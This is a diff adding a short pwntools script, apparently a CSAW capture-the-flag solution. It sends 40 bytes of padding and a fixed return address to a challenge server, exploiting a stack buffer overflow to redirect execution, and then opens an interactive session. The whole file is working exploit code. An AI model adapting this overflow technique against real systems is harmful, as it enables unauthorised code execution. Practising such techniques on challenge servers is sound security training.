@@ -1,0 +1,14 @@
+from pwn import *
+
+sh = remote('pwn.chal.csaw.io', 9001)
+
+sh.recvuntil('??')
+
+payload = "A" * 40
+
+address = p64(0x004005b6)
+
+payload += address
+
+sh.sendline(payload)
+sh.interactive()
